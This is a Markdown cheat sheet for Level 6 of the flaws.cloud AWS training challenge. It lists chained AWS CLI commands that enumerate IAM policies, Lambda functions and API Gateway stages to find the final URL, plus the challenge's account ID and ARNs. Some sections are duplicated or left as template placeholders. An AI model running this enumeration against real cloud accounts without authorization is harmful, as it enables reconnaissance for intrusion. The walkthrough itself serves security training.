# Flaws.Cloud 1 - Walkthrough Cheat Sheet



## Guide Table of Contents
- [Flaws.Cloud 1 - Walkthrough Cheat Sheet](#flawscloud-1---walkthrough-cheat-sheet)
  - [Guide Table of Contents](#guide-table-of-contents)
  - [Challenge Prerequisites](#challenge-prerequisites)
  - [Challenge Tools](#challenge-tools)
  - [Guide Table of Contents](#guide-table-of-contents-1)
  - [Commands Used in Challenge](#commands-used-in-challenge)
  - [Important Notes from Challenge](#important-notes-from-challenge)
- [Levels](#levels)
  - [Level 0 -  Level 0 Name](#level-0----level-0-name)
    - [Level 0 Prerequisites](#level-0-prerequisites)
    - [Level 0 Tools](#level-0-tools)
    - [Commands Used in Level 0](#commands-used-in-level-0)
  - [Important Notes from Level 0](#important-notes-from-level-0)
  - [Final Level 6 -  Final Level 6 Name](#final-level-6----final-level-6-name)
    - [Final Level 6 Prerequisites](#final-level-6-prerequisites)
    - [Final Level 6 Tools](#final-level-6-tools)
    - [Commands Used in Final Level 6](#commands-used-in-final-level-6)
    - [Important Notes from Final Level 6](#important-notes-from-final-level-6)










## Challenge Prerequisites
6. Level 6
   1. Full Update
      1. `sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get autoremove -y && sudo apt-get autoclean -y`
   2. JQ
      1. [jq](https://stedolan.github.io/jq/ "jq JSON Parser")
   3. AWS CLI installed
      1. [AWS cli installation file script](./Flaws-Scripts/aws_cli_install.sh)
   4. AWS CLI Profile configured
      1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)
   5. AdministratorAccess Policy Attached to L4Profile
      1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AdministratorAccess$jsonEditor "AdministratorAccess")


## Challenge Tools
6. Level 6
   1. [AWS sts](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html "AWS STS Get Caller Identity")
      1. [`aws sts get-caller-identity`](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html "AWS STS Get Caller Identity")
   2. [AWS Lambda](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html "AWS Lambda")
      1. [`aws lambda list-functions`](https://docs.aws.amazon.com/cli/latest/reference/lambda/list-functions.html "AWS Lambda List Functions")
      2. [`aws lambda invoke`](https://docs.aws.amazon.com/cli/latest/reference/lambda/invoke.html "AWS Lambda Invoke")
      3. [`aws lambda get-function`](https://docs.aws.amazon.com/cli/latest/reference/lambda/get-function.html "AWS Lambda Get Function")
      4. [`aws lambda get-policy`](https://docs.aws.amazon.com/cli/latest/reference/lambda/get-policy.html "AWS Lambda Get Policy")
   3. [AWS API Gateway](https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html "AWS API Gateway")
      1. [`aws apigateway get-rest-apis`](https://docs.aws.amazon.com/cli/latest/reference/apigateway/get-rest-apis.html "AWS API Gateway Get Rest APIs")
      2. [`aws apigateaway get-stages`](https://docs.aws.amazon.com/cli/latest/reference/apigateway/get-stages.html "AWS API Gateway Get Stages")
   4. [Linux Text Parsing Tools](https://www.geeksforgeeks.org/linux-text-parsing-tools/ "Linux Text Parsing Tools")
   5. [`xargs -I`](https://www.geeksforgeeks.org/xargs-command-in-linux-with-examples/ "xargs Command")
   6. [`tr`](https://www.geeksforgeeks.org/tr-command-in-linux-with-examples/ "tr Command")
   7.  [`grep`](https://www.geeksforgeeks.org/grep-command-in-linux-unix-with-examples/ "grep Command")
   8.  [`cut -d`](https://www.geeksforgeeks.org/cut-command-linux-examples/ "cut Command")
   9.  [`sort`](https://www.geeksforgeeks.org/sort-command-linuxunix-examples/ "sort Command")
   10. [`uniq`](https://www.geeksforgeeks.org/uniq-command-linux-examples/ "uniq Command")


## Commands Used in Challenge 
| 6.0. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6.1. :pager:  `./Flaws-Scripts/aws_cli_configure_L6Profile.sh`   | Configure AWS CLI                        |
| 6.2. :pager:  `aws iam get-user --profile $L6_USER --region $AWS_REGION`   |  Get IAM User Info                         |
| 6.3. :pager:  `export L6_IAM_USER_POLICIES=$(aws iam list-attached-user-policies --user-name "$L6_IAM_USER" --profile "$L6_USER" --region "$AWS_REGION" --query 'AttachedPolicies[].PolicyArn' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" iam get-policy --policy-arn {} --query 'Policy.{PolicyName: PolicyName, PolicyArn: Arn, DefaultVersionId: DefaultVersionId}' --output json | jq -s '.')`   |  Get IAM User Attached Policies                         |  
| 6.4. :pager:  `Flaws-Scripts/aws_iam_full_policies`   |  Get IAM User Attached Policies Full Output                       |  
| 6.5. :pager:  `export L6_ACCOUNT_ID=$(aws --region $AWS_REGION --profile $L6_USER sts get-caller-identity --query 'Account' --output text)`   |  Get Level 6 Account ID                      |  
| 6.6. :pager:  `export L6_EC2_LAMBDA_FUNCTION=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '[:upper:]' '[:lower:]')`   |  Get EC2 Lambda Function Name                       |  
| 6.7. :pager:  `export L6_EC2_LAMBDA_POLICY=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.')`   |  Get EC2 Lambda Function Policy                      |  
| 6.8. :pager:  `export L6_EC2_LAMBDA_ARN_STR=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Condition.ArnLike."AWS:SourceArn"')`   |  Get EC2 Lambda Function ARN STR                      |  
| 6.9. :pager:  `export L6_EC2_LAMBDA_API=$(echo "$L6_EC2_LAMBDA_ARN_STR" | cut -d ':' -f 6 | cut -d '/' -f 1)`   |  Get EC2 Lambda Function API                      |  
| 6.10. :pager:  `export L6_EC2_LAMBDA_STAGE=$(aws --region $AWS_REGION --profile $L6_USER apigateway get-stages --rest-api-id $L6_EC2_LAMBDA_API --query 'item[0].stageName' --output text)`   |  Get EC2 Lambda Function Stage                      |  
| 6.11. :pager:  `export L6_EC2_LAMBDA_SERVICE=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Principal.Service' | tr -d '"' | sed 's/\..*//' | uniq )`   |  Get EC2 Lambda Function Service                      |  
| 6.12. :pager:  `export L6_EC2_LAMBDA_FUNC_DOMAIN=$(echo "$L6_EC2_LAMBDA_ARN_STR" | grep -oP 'arn:aws:\K\w+-\w+')`   |  Get EC2 Lambda Function Domain                      |  
| 6.13. :pager:  `export L6_LAMBDA_FINAL_URL="https://$L6_EC2_LAMBDA_API.$L6_EC2_LAMBDA_FUNC_DOMAIN.$AWS_REGION.amazonaws.com/$L6_EC2_LAMBDA_STAGE/$L6_EC2_LAMBDA_FUNCTION"`   |  Get EC2 Lambda Function Final URL                      |  
| 6.14. :pager:  `export L6_FINAL_URL=$(curl -s -X GET "$L6_LAMBDA_FINAL_URL" | grep -oP 'http[s]?://\S+')`   |  Get Level 6 Final URL                      |  
| 6.14. :pager:  `export L6_FINAL_URL=$(curl -s -X GET "$L6_LAMBDA_FINAL_URL" | grep -oP 'http[s]?://\S+')`   |  Get Level 6 Final URL                      |  


## Important Notes from Challenge
| 6. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 6.0. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 6.1. :pushpin: Level 6 Account Id                 | `975426262029`                                                             |      
| 6.2. :pushpin: IAM Policies                 | `MySecurityAudit:v1, list_apigateaways:v4`                                        |                        
| 6.3. :pushpin: Lambda Function                 | `level5`                                                                |
| 6.4. :pushpin: Lambda Policy                 | `Allow lambda:InvokeFunction using apigateway.amazonaws.com`               |                                                
| 6.5. :pushpin: Lambda Arn                 | `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6`           |                                                     
| 6.6. :pushpin: Lambda Final URL                 | `https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6`                                                                |
| 6.7. :pushpin: Final Level 6 URL                 | `http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"`                                                                |




                                                                          


# Levels


<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 0 - Template                                                                         -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
## Level 0 -  Level 0 Name
<!--*        ------------------------------ -->
### Level 0 Prerequisites
1. Prerequisite 1
   1. Prequisite Reference

### Level 0 Tools
1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")




### Commands Used in Level 0
| 0. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 0.0. :pager Title                | Description        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 0.1. :pager:  `Flaws-Scripts/aws_cli_configure_L.sh`   | Configure AWS CLI                        |






## Important Notes from Level 0
| :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 0.1. :pushpin:  Level 0 URL          | ``                                                                         |




<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 1 - AWS Un-Authenticated Enumeration                                                                         -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->

## Final Level 6 -  Final Level 6 Name
<!--*        ------------------------------ -->
### Final Level 6 Prerequisites
1. Full Update
   1. `sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get autoremove -y && sudo apt-get autoclean -y`
2. JQ
   1. [jq](https://stedolan.github.io/jq/ "jq JSON Parser")
3. AWS CLI installed
   1. [AWS cli installation file script](./Flaws-Scripts/aws_cli_install.sh)
4. AWS CLI Profile configured
   1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)
5. AdministratorAccess Policy Attached to L4Profile
   1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AdministratorAccess$jsonEditor "AdministratorAccess")


### Final Level 6 Tools
1. [AWS sts](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html "AWS STS Get Caller Identity")
   1. [`aws sts get-caller-identity`](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html "AWS STS Get Caller Identity")
2. [AWS Lambda](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html "AWS Lambda")
   1. [`aws lambda list-functions`](https://docs.aws.amazon.com/cli/latest/reference/lambda/list-functions.html "AWS Lambda List Functions")
   2. [`aws lambda invoke`](https://docs.aws.amazon.com/cli/latest/reference/lambda/invoke.html "AWS Lambda Invoke")
   3. [`aws lambda get-function`](https://docs.aws.amazon.com/cli/latest/reference/lambda/get-function.html "AWS Lambda Get Function")
   4. [`aws lambda get-policy`](https://docs.aws.amazon.com/cli/latest/reference/lambda/get-policy.html "AWS Lambda Get Policy")
3. [AWS API Gateway](https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html "AWS API Gateway")
   1. [`aws apigateway get-rest-apis`](https://docs.aws.amazon.com/cli/latest/reference/apigateway/get-rest-apis.html "AWS API Gateway Get Rest APIs")
   2. [`aws apigateaway get-stages`](https://docs.aws.amazon.com/cli/latest/reference/apigateway/get-stages.html "AWS API Gateway Get Stages")
4. [Linux Text Parsing Tools](https://www.geeksforgeeks.org/linux-text-parsing-tools/ "Linux Text Parsing Tools")
5. [`xargs -I`](https://www.geeksforgeeks.org/xargs-command-in-linux-with-examples/ "xargs Command")
6. [`tr`](https://www.geeksforgeeks.org/tr-command-in-linux-with-examples/ "tr Command")
7.  [`grep`](https://www.geeksforgeeks.org/grep-command-in-linux-unix-with-examples/ "grep Command")
8.  [`cut -d`](https://www.geeksforgeeks.org/cut-command-linux-examples/ "cut Command")
9.  [`sort`](https://www.geeksforgeeks.org/sort-command-linuxunix-examples/ "sort Command")
10. [`uniq`](https://www.geeksforgeeks.org/uniq-command-linux-examples/ "uniq Command")


### Commands Used in Final Level 6
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6.0. :pager: Level 6 Title                                                                | Level 6 Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6.1 :pager: 
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6.1. :pager:  `./Flaws-Scripts/aws_cli_configure_L6Profile.sh`   | Configure AWS CLI                        |
| 6.2. :pager:  `aws iam get-user --profile $L6_USER --region $AWS_REGION`   |  Get IAM User Info                         |
| 6.3. :pager:  `export L6_IAM_USER_POLICIES=$(aws iam list-attached-user-policies --user-name "$L6_IAM_USER" --profile "$L6_USER" --region "$AWS_REGION" --query 'AttachedPolicies[].PolicyArn' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" iam get-policy --policy-arn {} --query 'Policy.{PolicyName: PolicyName, PolicyArn: Arn, DefaultVersionId: DefaultVersionId}' --output json | jq -s '.')`   |  Get IAM User Attached Policies                         |  
| 6.4. :pager:  `Flaws-Scripts/aws_iam_full_policies`   |  Get IAM User Attached Policies Full Output                       |  
| 6.5. :pager:  `export L6_ACCOUNT_ID=$(aws --region $AWS_REGION --profile $L6_USER sts get-caller-identity --query 'Account' --output text)`   |  Get Level 6 Account ID                      |  
| 6.6. :pager:  `export L6_EC2_LAMBDA_FUNCTION=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '[:upper:]' '[:lower:]')`   |  Get EC2 Lambda Function Name                       |  
| 6.7. :pager:  `export L6_EC2_LAMBDA_POLICY=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.')`   |  Get EC2 Lambda Function Policy                      |  
| 6.8. :pager:  `export L6_EC2_LAMBDA_ARN_STR=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Condition.ArnLike."AWS:SourceArn"')`   |  Get EC2 Lambda Function ARN STR                      |  
| 6.9. :pager:  `export L6_EC2_LAMBDA_API=$(echo "$L6_EC2_LAMBDA_ARN_STR" | cut -d ':' -f 6 | cut -d '/' -f 1)`   |  Get EC2 Lambda Function API                      |  
| 6.10. :pager:  `export L6_EC2_LAMBDA_STAGE=$(aws --region $AWS_REGION --profile $L6_USER apigateway get-stages --rest-api-id $L6_EC2_LAMBDA_API --query 'item[0].stageName' --output text)`   |  Get EC2 Lambda Function Stage                      |  
| 6.11. :pager:  `export L6_EC2_LAMBDA_SERVICE=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Principal.Service' | tr -d '"' | sed 's/\..*//' | uniq )`   |  Get EC2 Lambda Function Service                      |  
| 6.12. :pager:  `export L6_EC2_LAMBDA_FUNC_DOMAIN=$(echo "$L6_EC2_LAMBDA_ARN_STR" | grep -oP 'arn:aws:\K\w+-\w+')`   |  Get EC2 Lambda Function Domain                      |  
| 6.13. :pager:  `export L6_LAMBDA_FINAL_URL="https://$L6_EC2_LAMBDA_API.$L6_EC2_LAMBDA_FUNC_DOMAIN.$AWS_REGION.amazonaws.com/$L6_EC2_LAMBDA_STAGE/$L6_EC2_LAMBDA_FUNCTION"`   |  Get EC2 Lambda Function Final URL                      |  
| 6.14. :pager:  `export L6_FINAL_URL=$(curl -s -X GET "$L6_LAMBDA_FINAL_URL" | grep -oP 'http[s]?://\S+')`   |  Get Level 6 Final URL                      |  
| 6.14. :pager:  `export L6_FINAL_URL=$(curl -s -X GET "$L6_LAMBDA_FINAL_URL" | grep -oP 'http[s]?://\S+')`   |  Get Level 6 Final URL                      |  











### Important Notes from Final Level 6
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 6. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 6.0. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 6.1. :pushpin: Level 6 Account Id                 | `975426262029`                                                             |      
| 6.2. :pushpin: IAM Policies                 | `MySecurityAudit:v1, list_apigateaways:v4`                                        |                        
| 6.3. :pushpin: Lambda Function                 | `level5`                                                                |
| 6.4. :pushpin: Lambda Policy                 | `Allow lambda:InvokeFunction using apigateway.amazonaws.com`               |                                                
| 6.5. :pushpin: Lambda Arn                 | `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6`           |                                                     
| 6.6. :pushpin: Lambda Final URL                 | `https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6`                                                                |
| 6.7. :pushpin: Final Level 6 URL                 | `http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"`                                                                |

